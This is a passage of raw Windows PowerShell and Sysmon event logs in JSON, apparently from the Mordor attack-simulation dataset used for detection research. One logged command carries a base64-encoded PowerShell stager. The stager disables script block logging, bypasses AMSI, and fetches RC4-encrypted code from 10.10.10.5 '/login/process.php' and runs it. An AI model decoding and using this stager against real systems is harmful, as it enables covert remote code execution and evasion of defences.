AEUAQwBUADEAMAAwAEMAbwBOAFQASQBuAHUARQA9ADAAOwAkAGEAOQA0ADgANgA9AE4AZQB3AC0ATwBiAEoARQBDAFQAIABTAHkAcwBUAEUAbQAuAE4ARQB0AC4AVwBlAGIAQwBsAEkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQB4AFQALgBFAG4AQwBPAGQAaQBuAGcAXQA6ADoAVQBOAEkAQwBvAGQARQAuAEcARQBUAFMAdAByAGkATgBHACgAWwBDAG8ATgBWAGUAUgB0AF0AOgA6AEYAUgBvAE0AQgBBAFMAZQA2ADQAUwB0AFIAaQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEQAbwBBAE8AQQBBAHcAQQBBAD0APQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJABBADkANAA4ADYALgBIAGUAYQBkAEUAcgBzAC4AQQBEAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABhADkANAA4ADYALgBQAFIATwBYAFkAPQBbAFMAeQBTAHQARQBtAC4ATgBlAFQALgBXAGUAYgBSAGUAUQB1AGUAcwB0AF0AOgA6AEQAZQBGAGEAVQBsAFQAVwBFAEIAUAByAE8AWABZADsAJABhADkANAA4ADYALgBQAFIATwBYAFkALgBDAFIAZQBkAEUATgB0AGkAYQBsAHMAIAA9ACAAWwBTAHkAUwBUAEUAbQAuAE4ARQB0AC4AQwByAGUARABFAE4AdABpAEEAbABDAGEAQwBIAGUAXQA6ADoARABFAGYAYQBVAEwAdABOAGUAdAB3AG8AUgBrAEMAUgBFAEQAZQBOAHQASQBBAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJABhADkANAA4ADYALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAeQBzAFQARQBtAC4AVABlAFgAVAAuAEUAbgBDAG8ARABpAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAVABCAFkAdABFAHMAKAAnADkAbABLAE0ATAAlAFQAQwAuAGoAbwA1AEgAQAA6AD8APgAwAG4AdQB2AFcAUwBlACoAYgBGAEkAfQBdAEUAQQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAEcAUwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwBVAE4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgAbwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAEEAOQA0ADgANgAuAEgARQBBAEQAZQBSAHMALgBBAGQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIASABDAHAATwBBAGMAbQBHAGQASQBPAEsAZwA9AGsAaABlAFQAegBZAGsAYgAyAFoATABJAEoAaQB0AGMANwBaAFgAbAA0AHgAeABzAHkAaABjAD0AIgApADsAJABkAGEAdABBAD0AJABhADkANAA4ADYALgBEAE8AdwBOAGwAbwBhAGQARABhAHQAQQAoACQAcwBlAFIAKwAkAFQAKQA7ACQASQB2AD0AJABEAEEAVABhAFsAMAAuAC4AMwBdADsAJABEAGEAVABhAD0AJABEAEEAVABhAFsANAAuAC4AJABkAGEAdABBAC4AbABFAG4ARwB0AGgAXQA7AC0AagBPAGkAbgBbAEMASABhAFIAWwBdAF0AKAAmACAAJABSACAAJABEAEEAdABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=\r\n        Engine Version = 5.1.18362.752\r\n        Runspace ID = 78f49efe-32de-4c99-80f6-3f5158742484\r\n        Pipeline ID = 1\r\n        Command Name = Get-Random\r\n        Command Type = Cmdlet\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 11289\r\n        User = MORDOR\\pgustavo\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n\r\n\r\nUser Data:\r\n\r\n","ContextInfo":"        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 5.1.18362.752\r\n        Host ID = ca33ee8b-7d2f-4343-83bb-33cd9ad23223\r\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBFAHIAcwBJAG8ATgBUAGEAQgBMAGUALgBQAFMAVgBFAFIAUwBJAE8AbgAuAE0AQQBKAG8AUgAgAC0ARwBlACAAMwApAHsAJAA1ADcAYQBmADAAPQBbAHIAZQBGAF0ALgBBAHMAUwBFAE0AQgBsAFkALgBHAEUAdABUAHkAUABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAGUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkAZgAoACQANQA3AGEAZgAwACkAewAkADQAOABhAGMANgA9ACQANQA3AEEAZgAwAC4ARwBFAHQAVgBhAEwAdQBlACgAJABuAHUATABsACkAOwBJAGYAKAAkADQAOABBAGMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADQAOABBAGMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0ADgAQQBjADYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEATAA9AFsAQwBvAGwATABFAEMAVABpAE8ATgBzAC4ARwBlAE4ARQByAGkAYwAuAEQAaQBjAFQAaQBPAG4AYQByAFkAWwBzAHQAUgBpAE4ARwAsAFMAWQBTAFQAZQBNAC4ATwBCAGoAZQBjAHQAXQBdADoAOgBuAEUAVwAoACkAOwAkAFYAQQBMAC4AQQBEAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAHYAYQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQANAA4AEEAYwA2AFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBsAH0ARQBMAHMAZQB7AFsAUwBDAFIASQBwAHQAQgBsAE8AYwBLAF0ALgAiAEcAZQB0AEYAaQBlAGAATABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdABWAEEATABVAEUAKAAkAE4AdQBsAEwALAAoAE4ARQBXAC0ATwBCAEoARQBDAFQAIABDAG8ATABsAGUAYwB0AEkATwBuAFMALgBHAEUATgBFAFIAaQBDAC4ASABBAHMAaABTAEUAdABbAFMAdAByAEkATgBHAF0AKQApAH0AJABSAEUAZgA9AFsAUgBFAGYAXQAuAEEAUwBzAGUAbQBCAGwAeQAuAEcAZQB0AFQAWQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpACcAKwAnAFUAdABpAGwAcwAnACkAOwAkAFIAZQBGAC4ARwBlAHQARgBJAGUATABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgAnACsAJwBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAVABWAEEAbAB1AGUAKAAkAG4AdQBMAGwALAAkAHQAcgBVAGUAKQA7AH0AOwBbAFMAWQBTAFQARQBNAC4ATgBlAFQALgBTAEUAUgB2AGkAYwBFAFAAbwBJAG4AVABNAEEAbgBBAGcARQBSAF0AOgA6AEUAWABQAEUAQwBUADEAMAAwAEMAbwBOAFQASQBuAHUARQA9ADAAOwAkAGEAOQA0ADgANgA9AE4AZQB3AC0ATwBiAEoARQBDAFQAIABTAHkAcwBUAEUAbQAuAE4ARQB0AC4AVwBlAGIAQwBsAEkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQB4AFQALgBFAG4AQwBPAGQAaQBuAGcAXQA6ADoAVQBOAEkAQwBvAGQARQAuAEcARQBUAFMAdAByAGkATgBHACgAWwBDAG8ATgBWAGUAUgB0AF0AOgA6AEYAUgBvAE0AQgBBAFMAZQA2ADQAUwB0AFIAaQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEQAbwBBAE8AQQBBAHcAQQBBAD0APQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJABBADkANAA4ADYALgBIAGUAYQBkAEUAcgBzAC4AQQBEAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABhADkANAA4ADYALgBQAFIATwBYAFkAPQBbAFMAeQBTAHQARQBtAC4ATgBlAFQALgBXAGUAYgBSAGUAUQB1AGUAcwB0AF0AOgA6AEQAZQBGAGEAVQBsAFQAVwBFAEIAUAByAE8AWABZADsAJABhADkANAA4ADYALgBQAFIATwBYAFkALgBDAFIAZQBkAEUATgB0AGkAYQBsAHMAIAA9ACAAWwBTAHkAUwBUAEUAbQAuAE4ARQB0AC4AQwByAGUARABFAE4AdABpAEEAbABDAGEAQwBIAGUAXQA6ADoARABFAGYAYQBVAEwAdABOAGUAdAB3AG8AUgBrAEMAUgBFAEQAZQBOAHQASQBBAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJABhADkANAA4ADYALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAeQBzAFQARQBtAC4AVABlAFgAVAAuAEUAbgBDAG8ARABpAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAVABCAFkAdABFAHMAKAAnADkAbABLAE0ATAAlAFQAQwAuAGoAbwA1AEgAQAA6AD8APgAwAG4AdQB2AFcAUwBlACoAYgBGAEkAfQBdAEUAQQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAEcAUwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwBVAE4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgAbwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAEEAOQA0ADgANgAuAEgARQBBAEQAZQBSAHMALgBBAGQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIASABDAHAATwBBAGMAbQBHAGQASQBPAEsAZwA9AGsAaABlAFQAegBZAGsAYgAyAFoATABJAEoAaQB0AGMANwBaAFgAbAA0AHgAeABzAHkAaABjAD0AIgApADsAJABkAGEAdABBAD0AJABhADkANAA4ADYALgBEAE8AdwBOAGwAbwBhAGQARABhAHQAQQAoACQAcwBlAFIAKwAkAFQAKQA7ACQASQB2AD0AJABEAEEAVABhAFsAMAAuAC4AMwBdADsAJABEAGEAVABhAD0AJABEAEEAVABhAFsANAAuAC4AJABkAGEAdABBAC4AbABFAG4ARwB0AGgAXQA7AC0AagBPAGkAbgBbAEMASABhAFIAWwBdAF0AKAAmACAAJABSACAAJABEAEEAdABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=\r\n        Engine Version = 5.1.18362.752\r\n        Runspace ID = 78f49efe-32de-4c99-80f6-3f5158742484\r\n        Pipeline ID = 1\r\n        Command Name = Get-Random\r\n        Command Type = Cmdlet\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 11289\r\n        User = MORDOR\\pgustavo\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n","Category":"Executing Pipeline","@timestamp":"2020-07-22T04:19:01.095Z","Hostname":"WORKSTATION5.mordor.local","host":"wec.internal.cloudapp.net","AccountType":"User","AccountName":"pgustavo","ExecutionProcessID":9076,"EventType":"INFO","OpcodeValue":20,"EventTime":"2020-07-22 00:18:58","Severity":"INFO","EventID":4103,"ThreadID":5048,"RecordNumber":8728}
{"DestinationPort":"80","EventReceivedTime":"2020-07-22 00:19:01","SourceIp":"172.18.39.5","SourceHostname":"-","port":55069,"SeverityValue":2,"RuleName":"-","Keywords":-9223372036854775808,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"SourceIsIpv6":"false","ProcessGuid":"{b59756a9-b239-5f17-5307-000000000400}","ProcessId":"9076","Channel":"Microsoft-Windows-Sysmon/Operational","Message":"Network connection detected:\r\nRuleName: -\r\nUtcTime: 2020-07-22 04:18:58.770\r\nProcessGuid: {b59756a9-b239-5f17-5307-000000000400}\r\nProcessId: 9076\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nUser: MORDOR\\pgustavo\r\nProtocol: tcp\r\nInitiated: true\r\nSourceIsIpv6: false\r\nSourceIp: 172.18.39.5\r\nSourceHostname: -\r\nSourcePort: 51072\r\nSourcePortName: -\r\nDestinationIsIpv6: false\r\nDestinationIp: 10.10.10.5\r\nDestinationHostname: -\r\nDestinationPort: 80\r\nDestinationPortName: -","@timestamp":"2020-07-22T04:19:01.095Z","DestinationPortName":"-","AccountType":"User","AccountName":"SYSTEM","ThreadID":6108,"Task":3,"RecordNumber":1782128,"Initiated":"true","DestinationIp":"10.10.10.5","@version":"1","SourceModuleType":"im_msvistalog","tags":["mordorDataset"],"Domain":"NT AUTHORITY","DestinationHostname":"-","SourceName":"Microsoft-Windows-Sysmon","UserID":"S-1-5-18","Protocol":"tcp","SourceModuleName":"eventlog","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","UtcTime":"2020-07-22 04:18:58.770","Hostname":"WORKSTATION5.mordor.local","SourcePortName":"-","DestinationIsIpv6":"false","host":"wec.internal.cloudapp.net","ExecutionProcessID":9368,"EventType":"INFO","OpcodeValue":0,"EventTime":"2020-07-22 00:19:00","Severity":"INFO","EventID":3,"User":"MORDOR\\pgustavo","SourcePort":"51072"}
{"Task":10,"EventReceivedTime":"2020-07-22 00:19:01","SourceProcessGUID":"{03255e25-9966-5f14-1200-000000000400}","SourceThreadId":"5184","port":55069,"SeverityValue":2,"RuleName":"-","Keywords":-9223372036854775808,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","@version":"1","SourceProcessId":"444","TargetProcessId":"3232","Version":3,"SourceModuleType":"im_msvistalog","tags":["mordorDataset"],"Domain":"NT AUTHORITY","SourceName":"Microsoft-Windows-Sysmon","ProcessId":"444","UserID":"S-1-5-18","GrantedAccess":"0x1000","Channel":"Microsoft-Windows-Sysmon/Operational","SourceModuleName":"eventlog","Message":"Process accessed:\r\nRuleName: -\r\nUtcTime: 2020-07-22 04:19:00.001\r\nSourceProcessGUID: {03255e25-9966-5f14-1200-000000000400}\r\nSourceProcessId: 444\r\nSourceThreadId: 5184\r\nSourceImage: C:\\windows\\system32\\svchost.exe\r\nTargetProcessGUID: {03255e25-996e-5f14-4700-000000000400}\r\nTargetProcessId: 3232\r\nTargetImage: C:\\windows\\System32\\svchost.exe\r\nGrantedAccess: 0x1000\r\nCallTrace: C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\System32\\KERNELBASE.dll+6a7f5|c:\\windows\\system32\\lsm.dll+10225|C:\\windows\\System32\\RPCRT4.dll+76953|C:\\windows\\System32\\RPCRT4.dll+da036|C:\\windows\\System32\\RPCRT4.dll+37a4c|C:\\windows\\System32\\RPCRT4.dll+548c8|C:\\windows\\System32\\RPCRT4.dll+2c921|C:\\windows\\System32\\RPCRT4.dll+2c1db|C:\\windows\\System32\\RPCRT4.dll+1a86f|C:\\windows\\System32\\RPCRT4.dll+19d1a|C:\\windows\\System32\\RPCRT4.dll+19301|C:\\windows\\System32\\RPCRT4.dll+18d6e|C:\\windows\\System32\\RPCRT4.dll+169a5|C:\\windows\\SYSTEM32\\ntdll.dll+333ed|C:\\windows\\SYSTEM32\\ntdll.dll+34142|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","UtcTime":"2020-07-22 04:19:00.001","TargetImage":"C:\\windows\\System32\\svchost.exe","@timestamp":"2020-07-22T04:19:01.095Z","TargetProcessGUID":"{03255e25-996e-5f14-4700-000000000400}","Hostname":"WORKSTATION6.mordor.local","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\System32\\KERNELBASE.dll+6a7f5|c:\\windows\\system32\\lsm.dll+10225|C:\\windows\\System32\\RPCRT4.dll+76953|C:\\windows\\System32\\RPCRT4.dll+da036|C:\\windows\\System32\\RPCRT4.dll+37a4c|C:\\windows\\System32\\RPCRT4.dll+548c8|C:\\windows\\System32\\RPCRT4.dll+2c921|C:\\windows\\System32\\RPCRT4.dll+2c1db|C:\\windows\\System32\\RPCRT4.dll+1a86f|C:\\windows\\System32\\RPCRT4.dll+19d1a|C:\\windows\\System32\\RPCRT4.dll+19301|C:\\windows\\System32\\RPCRT4.dll+18d6e|C:\\windows\\System32\\RPCRT4.dll+169a5|C:\\windows\\SYSTEM32\\ntdll.dll+333ed|C:\\windows\\SYSTEM32\\ntdll.dll+34142|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","host":"wec.internal.cloudapp.net","AccountType":"User","AccountName":"SYSTEM","ExecutionProcessID":7856,"EventType":"INFO","OpcodeValue":0,"EventTime":"2020-07-22 00:19:00","Severity":"INFO","EventID":10,"SourceImage":"C:\\windows\\system32\\svchost.exe","ThreadID":6664,"RecordNumber":706022}
{"Task":10,"EventReceivedTime":"2020-07-22 00:19:01","SourceProcessGUID":"{b59756a9-9966-5f14-1200-000000000400}","SourceThreadId":"8808","port":55069,"SeverityValue":2,"RuleName":"-","Keywords":-9223372036854775808,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","@version":"1","SourceProcessId":"396","TargetProcessId":"3284","Version":3,"SourceModuleType":"im_msvistalog","tags":["mordorDataset"],"Domain":"NT AUTHORITY","SourceName":"Microsoft-Windows-Sysmon","ProcessId":"396","UserID":"S-1-5-18","GrantedAccess":"0x1000","Channel":"Microsoft-Windows-Sysmon/Operational","SourceModuleName":"eventlog","Message":"Process accessed:\r\nRuleName: -\r\nUtcTime: 2020-07-22 04:19:00.008\r\nSourceProcessGUID: {b59756a9-9966-5f14-1200-000000000400}\r\nSourceProcessId: 396\r\nSourceThreadId: 8808\r\nSourceImage: C:\\windows\\system32\\svchost.exe\r\nTargetProcessGUID: {b59756a9-996d-5f14-4700-000000000400}\r\nTargetProcessId: 3284\r\nTargetImage: C:\\windows\\System32\\svchost.exe\r\nGrantedAccess: 0x1000\r\nCallTrace: C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\System32\\KERNELBASE.dll+6a7f5|c:\\windows\\system32\\lsm.dll+10225|C:\\windows\\System32\\RPCRT4.dll+76953|C:\\windows\\System32\\RPCRT4.dll+da036|C:\\windows\\System32\\RPCRT4.dll+37a4c|C:\\windows\\System32\\RPCRT4.dll+548c8|C:\\windows\\System32\\RPCRT4.dll+2c921|C:\\windows\\System32\\RPCRT4.dll+2c1db|C:\\windows\\System32\\RPCRT4.dll+1a86f|C:\\windows\\System32\\RPCRT4.dll+19d1a|C:\\windows\\System32\\RPCRT4.dll+19301|C:\\windows\\System32\\RPCRT4.dll+18d6e|C:\\windows\\System32\\RPCRT4.dll+169a5|C:\\windows\\SYSTEM32\\ntdll.dll+333ed|C:\\windows\\SYSTEM32\\ntdll.dll+34142|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","UtcTime":"2020-07-22 04:19:00.008","TargetImage":"C:\\windows\\System32\\svchost.exe","@timestamp":"2020-07-22T04:19:01.095Z","TargetProcessGUID":"{b59756a9-996d-5f14-4700-000000000400}","Hostname":"WORKSTATION5.mordor.local","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\System32\\KERNELBASE.dll+6a7f5|c:\\windows\\system32\\lsm.dll+10225|C:\\windows\\System32\\RPCRT4.dll+76953|C:\\windows\\System32\\RPCRT4.dll+da036|C:\\windows\\System32\\RPCRT4.dll+37a4c|C:\\windows\\System32\\RPCRT4.dll+548c8|C:\\windows\\System32\\RPCRT4.dll+2c921|C:\\windows\\System32\\RPCRT4.dll+2c1db|C:\\windows\\System32\\RPCRT4.dll+1a86f|C:\\windows\\System32\\RPCRT4.dll+19d1a|C:\\windows\\System32\\RPCRT4.dll+19301|C:\\windows\\System32\\RPCRT4.dll+18d6e|C:\\windows\\System32\\RPCRT4.dll+169a5|C:\\windows\\SYSTEM32\\ntdll.dll+333ed|C:\\windows\\SYSTEM32\\ntdll.dll+34142|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","host":"wec.internal.cloudapp.net","AccountType":"User","AccountName":"SYSTEM","ExecutionProcessID":9368,"EventType":"INFO","OpcodeValue":0,"EventTime":"2020-07-22 00:19:00","Severity":"INFO","EventID":10,"SourceImage":"C:\\windows\\system32\\svchost.exe","ThreadID":6244,"RecordNumber":1782129}
{"Task":10,"EventReceivedTime":"2020-07-22 00:19:01","SourceProcessGUID":"{03255e25-9966-5f14-1200-000000000400}","SourceThreadId":"5184","port":55069,"SeverityValue":2,"RuleName":"-","Keywords":-9223372036854775808,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","@version":"1","SourceProcessId":"444","TargetProcessId":"3232","Version":3,"SourceModuleType":"im_msvistalog","tags":["mordorDataset"],"Domain":"NT AUTHORITY","SourceName":"Microsoft-Windows-Sysmon","ProcessId":"444","UserID":"S-1-5-18","GrantedAccess":"0x1000","Channel":"Microsoft-Windows-Sysmon/Operational","SourceModuleName":"eventlog","Message":"Process accessed:\r\nRuleName: -\r\nUtcTime: 2020-07-22 04:19:00.001\r\nSourceProcessGUID: {03255e25-9966-5f14-1200-000000000400}\r\nSourceProcessId: 444\r\nSourceThreadId: 5184\r\nSourceImage: C:\\windows\\system32\\svchost.exe\r\nTargetProcessGUID: {03255e25-996e-5f14-4700-000000000400}\r\nTargetProcessId: 3232\r\nTargetImage: C:\\windows\\System32\\svchost.exe\r\nGrantedAccess: 0x1000\r\nCallTrace: C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\System32\\KERNELBASE.dll+6a7f5|c:\\windows\\system32\\lsm.dll+108a0|C:\\windows\\System32\\RPCRT4.dll+76953|C:\\windows\\System32\\RPCRT4.dll+da036|C:\\windows\\System32\\RPCRT4.dll+37a4c|C:\\windows\\System32\\RPCRT4.dll+548c8|C:\\windows\\System32\\RPCRT4.dll+2c921|C:\\windows\\System32\\RPCRT4.dll+2c1db|C:\\windows\\System32\\RPCRT4.dll+1a86f|C:\\windows\\System32\\RPCRT4.dll+19d1a|C:\\windows\\System32\\RPCRT4.dll+19301|C:\\windows\\System32\\RPCRT4.dll+18d6e|C:\\windows\\System32\\RPCRT4.dll+169a5|C:\\windows\\SYSTEM32\\ntdll.dll+333ed|C:\\windows\\SYSTEM32\\ntdll.dll+34142|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","UtcTime":"2020-07-22 04:19:00.001","TargetImage":"C:\\windows\\System32\\svchost.exe","@timestamp":"2020-07-22T04:19:01.096Z","TargetProcessGUID":"{03255e25-996e-5f14-4700-000000000400}","Hostname":"WORKSTATION6.mordor.local","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\System32\\KERNELBASE.dll+6a7f5|c:\\windows\\system32\\lsm.dll+108a0|C:\\windows\\System32\\RPCRT4.dll+76953|C:\\windows\\System32\\RPCRT4.dll+da036|C:\\windows\\System32\\RPCRT4.dll+37a4c|C:\\windows\\System32\\RPCRT4.dll+548c8|C:\\windows\\System32\\RPCRT4.dll+2c921|C:\\windows\\System32\\RPCRT4.dll+2c1db|C:\\windows\\System32\\RPCRT4.dll+1a86f|C:\\windows\\System32\\RPCRT4.dll+19d1a|C:\\windows\\System32\\RPCRT4.dll+19301|C:\\windows\\System32\\RPCRT4.dll+18d6e|C:\\windows\\System32\\RPCRT4.dll+169a5|C:\\windows\\SYSTEM32\\ntdll.dll+333ed|C:\\windows\\SYSTEM32\\ntdll.dll+34142|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","host":"wec.internal.cloudapp.net","AccountType":"User","AccountName":"SYSTEM","ExecutionProcessID":7856,"EventType":"INFO","OpcodeValue":0,"EventTime":"2020-07-22 00:19:00","Severity":"INFO","EventID":10,"SourceImage":"C:\\windows\\system32\\svchost.exe","ThreadID":6664,"RecordNumber":706023}
{"Task":10,"EventReceivedTime":"2020-07-22 00:19:01","SourceProcessGUID":"{b59756a9-9966-5f14-1200-000000000400}","SourceThreadId":"8808","port":55069,"SeverityValue":2,"RuleName":"-","Keywords":-9223372036854775808,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","@version":"1","SourceProcessId":"396","TargetProcessId":"3284","Version":3,"SourceModuleType":"im_msvistalog","tags":["mordorDataset"],"Domain":"NT AUTHORITY","SourceName":"Microsoft-Windows-Sysmon","ProcessId":"396","UserID":"S-1-5-18","GrantedAccess":"0x1000","Channel":"Microsoft-Windows-Sysmon/Operational","SourceModuleName":"eventlog","Message":"Process accessed:\r\nRuleName: -\r\nUtcTime: 2020-07-22 04:19:00.008\r\nSourceProcessGUID: {b59756a9-9966-5f14-1200-000000000400}\r\nSourceProcessId: 396\r\nSourceThreadId: 8808\r\nSourceImage: C:\\windows\\system32\\svchost.exe\r\nTargetProcessGUID: {b59756a9-996d-5f14-4700-000000000400}\r\nTargetProcessId: 3284\r\nTargetImage: C:\\windows\\System32\\svchost.exe\r\nGrantedAccess: 0x1000\r\nCallTrace: 